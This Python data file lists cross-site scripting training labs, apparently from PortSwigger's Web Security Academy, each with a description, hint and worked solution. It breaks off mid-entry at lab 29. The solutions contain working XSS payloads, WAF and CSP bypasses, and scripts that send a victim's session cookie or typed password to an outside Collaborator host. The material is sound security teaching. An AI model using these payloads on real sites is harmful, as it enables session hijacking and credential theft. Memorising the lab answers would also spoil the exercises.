CROSS_SITE_SCRIPTING_LABS = [
    {
        "id": "1",
        "name": "Reflected XSS into HTML context with nothing encoded",
        "link": "/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded",
        "difficulty": "APPRENTICE",
        "out_of_band": False,
        "description": "This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. To solve the lab, perform a cross-site scripting attack that calls the alert function.",
        "hint": "ACCESS THE LAB   <p class=\"no-script-lab-warning\">Launching labs may take some time, please hold on while we build your environment.</p>",
        "solution": "Copy and paste the following into the search box:  <script>alert(1)</script>   Click \"Search\"."
    },
    {
        "id": "2",
        "name": "Stored XSS into HTML context with nothing encoded",
        "link": "/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded",
        "difficulty": "APPRENTICE",
        "out_of_band": False,
        "description": "Lab: Stored XSS into HTML context with nothing encoded   APPRENTICE                                        This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the blog post is viewed.",
        "hint": "ACCESS THE LAB   <p class=\"no-script-lab-warning\">Launching labs may take some time, please hold on while we build your environment.</p>",
        "solution": "Solution    Enter the following into the comment box:  <script>alert(1)</script>   Enter a name, email and website.  Click \"Post comment\".  Go back to the blog."
    },
    {
        "id": "3",
        "name": "DOM XSS in document.write sink using source location.search",
        "link": "/web-security/cross-site-scripting/dom-based/lab-document-write-sink",
        "difficulty": "APPRENTICE",
        "out_of_band": False,
        "description": "This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search , which you can control using the website URL. To solve this lab, perform a cross-site scripting attack that calls the alert function.",
        "hint": "Enter a random alphanumeric string into the search box. Right-click and inspect the element, and observe that your random string has been placed inside an img src attribute.",
        "solution": "Break out of the img attribute by searching for: \"><svg onload=alert(1)>"
    },
    {
        "id": "4",
        "name": "DOM XSS in innerHTML sink using source location.search",
        "link": "/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink",
        "difficulty": "APPRENTICE",
        "out_of_band": False,
        "description": "This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search. To solve this lab, perform a cross-site scripting attack that calls the alert function.",
        "hint": "The value of the src attribute is invalid and throws an error. This triggers the onerror event handler, which then calls the alert() function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.",
        "solution": "Enter the following into the into the search box: <img src=1 onerror=alert(1)> Click \"Search\"."
    },
    {
        "id": "5",
        "name": "DOM XSS in jQuery anchor href attribute sink using location.search source",
        "link": "/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink",
        "difficulty": "APPRENTICE",
        "out_of_band": False,
        "description": "Lab: DOM XSS in jQuery anchor href attribute sink using location.search source APPRENTICE This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search. To solve this lab, make the \"back\" link alert document.cookie.",
        "hint": "On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string. Right-click and inspect the element, and observe that your random string has been placed inside an a href attribute.",
        "solution": "Change returnPath to: javascript:alert(document.cookie) Hit enter and click \"back\"."
    },
    {
        "id": "6",
        "name": "DOM XSS in jQuery selector sink using a hashchange event",
        "link": "/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event",
        "difficulty": "APPRENTICE",
        "out_of_band": True,
        "description": "Lab: DOM XSS in jQuery selector sink using a hashchange event   APPRENTICE                                        This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property. To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.    ACCESS THE LAB   <p class=\"no-script-lab-warning\">Launching labs may take some time, please hold on while we build your environment.</p>",
        "hint": "Notice the vulnerable code on the home page using Burp or the browser's DevTools.  From the lab banner, open the exploit server.",
        "solution": "In the Body section, add the following malicious iframe :  <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>   Store the exploit, then click View exploit to confirm that the print() function is called.  Go back to the exploit server and click Deliver to victim to solve the lab."
    },
    {
        "id": "7",
        "name": "Reflected XSS into attribute with angle brackets HTML-encoded",
        "link": "/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded",
        "difficulty": "APPRENTICE",
        "out_of_band": False,
        "description": "Lab: Reflected XSS into attribute with angle brackets HTML-encoded   APPRENTICE                                        This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.",
        "hint": "Just because you're able to trigger the alert() yourself doesn't mean that this will work on the victim. You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.",
        "solution": "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.  Observe that the random string has been reflected inside a quoted attribute.   Replace your input with the following payload to escape the quoted attribute and inject an event handler:  \"onmouseover=\"alert(1)   Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you move the mouse over the injected element it should trigger an alert."
    },
    {
        "id": "8",
        "name": "Stored XSS into anchor href attribute with double quotes HTML-encoded",
        "link": "/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded",
        "difficulty": "APPRENTICE",
        "out_of_band": False,
        "description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.",
        "hint": "Post a comment with a random alphanumeric string in the \"Website\" input, then use Burp Suite to intercept the request and send it to Burp Repeater. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater. Observe that the random string in the second Repeater tab has been reflected inside an anchor href attribute.",
        "solution": "Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert: javascript:alert(1). Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert."
    },
    {
        "id": "9",
        "name": "Reflected XSS into a JavaScript string with angle brackets HTML encoded",
        "link": "/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded",
        "difficulty": "APPRENTICE",
        "out_of_band": False,
        "description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
        "hint": "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. Observe that the random string has been reflected inside a JavaScript string.",
        "solution": "Replace your input with the following payload to break out of the JavaScript string and inject an alert: '-alert(1)-' Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
    },
    {
        "id": "10",
        "name": "DOM XSS in document.write sink using source location.search inside a select element",
        "link": "/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element. To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.",
        "hint": "On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality.",
        "solution": "Add a storeId query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL. In the browser, notice that your random string is now listed as one of the options in the drop-down list. Right-click and inspect the drop-down list to confirm that the value of your storeId parameter has been placed inside a select element. Change the URL to include a suitable XSS payload inside the storeId parameter as follows: product?productId=1&storeId=\"></select><img%20src=1%20onerror=alert(1)>"
    },
    {
        "id": "11",
        "name": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded",
        "link": "/web-security/cross-site-scripting/dom-based/lab-angularjs-expression",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality. AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded. To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.",
        "hint": "Enter a random alphanumeric string into the search box. View the page source and observe that your random string is enclosed in an ng-app directive.",
        "solution": "Enter the following AngularJS expression in the search box: {{$on.constructor('alert(1)')()}} Click search."
    },
    {
        "id": "12",
        "name": "Reflected DOM XSS",
        "link": "/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink. To solve this lab, create an injection that calls the alert() function.",
        "hint": "In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on. Back in the lab, go to the target website and use the search bar to search for a random test string, such as \"XSS\". Return to the Proxy tool in Burp Suite and forward the request. On the Intercept tab, notice that the string is reflected in a JSON response called search-results. From the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.",
        "solution": "To solve the lab, enter the following search term: \\\"-alert(1)}//. As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term. An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows: {\"searchTerm\":\"\\\\\"-alert(1)}//\", \"results\":[]}."
    },
    {
        "id": "13",
        "name": "Stored DOM XSS",
        "link": "/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "Lab: Stored DOM XSS PRACTITIONER This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. ACCESS THE LAB Launching labs may take some time, please hold on while we build your environment.",
        "hint": "In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence.",
        "solution": "Post a comment containing the following vector: <><img src=1 onerror=alert(1)> We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML."
    },
    {
        "id": "14",
        "name": "Reflected XSS into HTML context with most tags and attributes blocked",
        "link": "/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked",
        "difficulty": "PRACTITIONER",
        "out_of_band": True,
        "description": "Lab: Reflected XSS into HTML context with most tags and attributes blocked   PRACTITIONER                                        This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.  Note  Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.",
        "hint": "Inject a standard XSS vector, such as:  <img src=1 onerror=print()>   Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.  Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.  In Burp Intruder, replace the value of the search term with: <>   Place the cursor between the angle brackets and click Add \u00a7 to create a payload position. The value of the search term should now look like: <\u00a7\u00a7>   Visit the XSS cheat sheet and click Copy tags to clipboard .  In the Payloads side panel, under Payload configuration , click Paste to paste the list of tags into the payloads list. Click Start attack .  When the attack is finished, review the results. Note that most payloads caused a 400 response, but the body payload caused a 200 response.   Go back to Burp Intruder and replace your search term with:  <body%20=1>   Place the cursor before the = character and click Add \u00a7 to create a payload position. The value of the search term should now look like: <body%20\u00a7\u00a7=1>   Visit the XSS cheat sheet and click Copy events to clipboard .  In the Payloads side panel, under Payload configuration , click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click Start attack .  When the attack is finished, review the results. Note that most payloads caused a 400 response, but the onresize payload caused a 200 response.",
        "solution": "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:  <iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>   Click Store and Deliver exploit to victim ."
    },
    {
        "id": "15",
        "name": "Reflected XSS into HTML context with all tags blocked except custom ones",
        "link": "/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked",
        "difficulty": "PRACTITIONER",
        "out_of_band": True,
        "description": "Lab: Reflected XSS into HTML context with all tags blocked except custom ones   PRACTITIONER                                        This lab blocks all HTML tags except custom ones. To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie .    ACCESS THE LAB   <p class=\"no-script-lab-warning\">Launching labs may take some time, please hold on while we build your environment.</p>",
        "hint": "This injection creates a custom tag with the ID x , which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.",
        "solution": "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:  <script>\nlocation = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';\n</script>   Click \"Store\" and \"Deliver exploit to victim\"."
    },
    {
        "id": "16",
        "name": "Reflected XSS with some SVG markup allowed",
        "link": "/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events. To solve the lab, perform a cross-site scripting attack that calls the alert() function.",
        "hint": "Inject a standard XSS payload, such as: <img src=1 onerror=alert(1)>. Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.",
        "solution": "Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder. In the request template, replace the value of the search term with: <>. Place the cursor between the angle brackets and click Add \u00a7 to create a payload position. The value of the search term should now be: <\u00a7\u00a7>. Visit the XSS cheat sheet and click Copy tags to clipboard. In Burp Intruder, in the Payloads side panel, click Paste to paste the list of tags into the payloads list. Click Start attack. When the attack is finished, review the results. Observe that all payloads caused a 400 response, except for the ones using the <svg>, <animatetransform>, <title>, and <image> tags, which received a 200 response. Go back to the Intruder tab and replace your search term with: <svg><animatetransform%20=1>. Place the cursor before the = character and click Add \u00a7 to create a payload position. The value of the search term should now be: <svg><animatetransform%20\u00a7\u00a7=1>. Visit the XSS cheat sheet and click Copy events to clipboard. In Burp Intruder, in the Payloads side panel, click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click Start attack. When the attack is finished, review the results. Note that all payloads caused a 400 response, except for the onbegin payload, which caused a 200 response. Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved: https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E."
    },
    {
        "id": "17",
        "name": "Reflected XSS in canonical link tag",
        "link": "/web-security/cross-site-scripting/contexts/lab-canonical-link-tag",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "Lab: Reflected XSS in canonical link tag   PRACTITIONER                                        This lab reflects user input in a canonical link tag and escapes angle brackets. To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function. To assist with your exploit, you can assume that the simulated user will press the following key combinations:   ALT+SHIFT+X    CTRL+ALT+X    Alt+X   Please note that the intended solution to this lab is only possible in Chrome.    ACCESS THE LAB   <p class=\"no-script-lab-warning\">Launching labs may take some time, please hold on while we build your environment.</p>",
        "hint": "To trigger the exploit on yourself, press one of the following key combinations:  On Windows: ALT+SHIFT+X   On MacOS: CTRL+ALT+X   On Linux: Alt-X",
        "solution": "Visit the following URL, replacing YOUR-LAB-ID with your lab ID:  https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)  This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called."
    },
    {
        "id": "18",
        "name": "Reflected XSS into a JavaScript string with single quote and backslash escaped",
        "link": "/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
        "hint": "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. Observe that the random string has been reflected inside a JavaScript string. Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.",
        "solution": "Replace your input with the following payload to break out of the script block and inject a new script: </script><script>alert(1)</script> Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
    },
    {
        "id": "19",
        "name": "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped",
        "link": "/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped   PRACTITIONER                                        This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
        "hint": "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.  Observe that the random string has been reflected inside a JavaScript string.  Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.  Try sending the payload test\\payload and observe that your backslash doesn't get escaped.",
        "solution": "Replace your input with the following payload to break out of the JavaScript string and inject an alert:  \\'-alert(1)//   Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
    },
    {
        "id": "20",
        "name": "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped",
        "link": "/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped   PRACTITIONER                                        This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.",
        "hint": "Post a comment with a random alphanumeric string in the \"Website\" input, then use Burp Suite to intercept the request and send it to Burp Repeater.  Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.  Observe that the random string in the second Repeater tab has been reflected inside an onclick event handler attribute.",
        "solution": "Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert , using the following payload:  http://foo?&apos;-alert(1)-&apos;   Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert."
    },
    {
        "id": "21",
        "name": "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped",
        "link": "/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.",
        "hint": "Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. Observe that the random string has been reflected inside a JavaScript template string.",
        "solution": "Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)} Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
    },
    {
        "id": "22",
        "name": "Exploiting cross-site scripting to steal cookies",
        "link": "/web-security/cross-site-scripting/exploiting/lab-stealing-cookies",
        "difficulty": "PRACTITIONER",
        "out_of_band": True,
        "description": "This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server. Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.",
        "hint": "Using Burp Suite Professional, go to the Collaborator tab. Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated: <script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script> This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.",
        "solution": "Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again. Take a note of the value of the victim's cookie in the POST body. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page. Alternative solution: Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by exploiting the XSS to perform CSRF. However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed."
    },
    {
        "id": "23",
        "name": "Exploiting cross-site scripting to capture passwords",
        "link": "/web-security/cross-site-scripting/exploiting/lab-capturing-passwords",
        "difficulty": "PRACTITIONER",
        "out_of_band": True,
        "description": "This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.  Note  To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.  Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.",
        "hint": "Using Burp Suite Professional, go to the Collaborator tab.  Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.   Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:  <input name=username id=username>\n<input type=password name=password onchange=\"if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{\nmethod:'POST',\nmode: 'no-cors',\nbody:username.value+':'+this.value\n});\">  This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.   Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.  Take a note of the value of the victim's username and password in the POST body.  Use the credentials to log in as the victim user.",
        "solution": "Alternatively, you could adapt the attack to make the victim post their credentials within a blog comment by exploiting the XSS to perform CSRF . However, this is far less subtle because it exposes the username and password publicly, and also discloses evidence that the attack was performed."
    },
    {
        "id": "24",
        "name": "Exploiting XSS to bypass CSRF defenses",
        "link": "/web-security/cross-site-scripting/exploiting/lab-perform-csrf",
        "difficulty": "PRACTITIONER",
        "out_of_band": False,
        "description": "Lab: Exploiting XSS to bypass CSRF defenses   PRACTITIONER                                        This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments. You can log in to your own account using the following credentials: wiener:peter",
        "hint": "Hint  You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim.",
        "solution": "Solution   Log in using the credentials provided. On your user account page, notice the function for updating your email address.  If you view the source for the page, you'll see the following information:  You need to issue a POST request to /my-account/change-email , with a parameter called email .  There's an anti-CSRF token in a hidden input called token .  This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.   Submit the following payload in a blog comment:  <script>\nvar req = new XMLHttpRequest();\nreq.onload = handleResponse;\nreq.open('get','/my-account',true);\nreq.send();\nfunction handleResponse() {\n    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\n    var changeReq = new XMLHttpRequest();\n    changeReq.open('post', '/my-account/change-email', true);\n    changeReq.send('csrf='+token+'&email=test@test.com')\n};\n</script>  This will make anyone who views the comment issue a POST request to change their email address to test@test.com ."
    },
    {
        "id": "25",
        "name": "Reflected XSS with AngularJS sandbox escape without strings",
        "link": "/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings",
        "difficulty": "EXPERT",
        "out_of_band": False,
        "description": "Lab: Reflected XSS with AngularJS sandbox escape without strings   EXPERT                                        This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS. To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.",
        "hint": "The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1) . Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not.",
        "solution": "Visit the following URL, replacing YOUR-LAB-ID with your lab ID:  https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
    },
    {
        "id": "26",
        "name": "Reflected XSS with AngularJS sandbox escape and CSP",
        "link": "/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp",
        "difficulty": "EXPERT",
        "out_of_band": True,
        "description": "This lab uses CSP and AngularJS. To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie.",
        "hint": "The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object. Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z. The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check.",
        "solution": "Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script> location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script> Click \"Store\" and \"Deliver exploit to victim\"."
    },
    {
        "id": "27",
        "name": "Reflected XSS with event handlers and href attributes blocked",
        "link": "/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked",
        "difficulty": "EXPERT",
        "out_of_band": False,
        "description": "Lab: Reflected XSS with event handlers and href attributes blocked   EXPERT                                        This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked. To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function. Note that you need to label your vector with the word \"Click\" in order to induce the simulated lab user to click your vector. For example: <a href=\"\">Click me</a>    ACCESS THE LAB   <p class=\"no-script-lab-warning\">Launching labs may take some time, please hold on while we build your environment.</p>",
        "hint": "Community solutions  z3nsh3ll      Michael Sommer        Register for free to track your learning progress           Practise exploiting vulnerabilities on realistic targets.    Record your progression from Apprentice to Expert.    See where you rank in our Hall of Fame.             REGISTER          As we use reCAPTCHA, you need to be able to access Google's servers to use this function.         var recaptchaClientUrl = \"https://www.google.com/recaptcha/api.js?render=\";     Already got an account? Login here",
        "solution": "Solution  Visit the following URL, replacing YOUR-LAB-ID with your lab ID:  https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E"
    },
    {
        "id": "28",
        "name": "Reflected XSS in a JavaScript URL with some characters blocked",
        "link": "/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked",
        "difficulty": "EXPERT",
        "out_of_band": False,
        "description": "This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks. To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.",
        "hint": "The exploit uses exception handling to call the alert function with arguments. The throw statement is used, separated with a blank comment in order to get round the no spaces restriction. The alert function is assigned to the onerror exception handler. As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window.",
        "solution": "Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 The lab will be solved, but the alert will only be called if you click \"Back to blog\" at the bottom of the page."
    },
    {
        "id": "29",
        "name": "Reflected XSS protected by very strict CSP, with dangling markup attack",
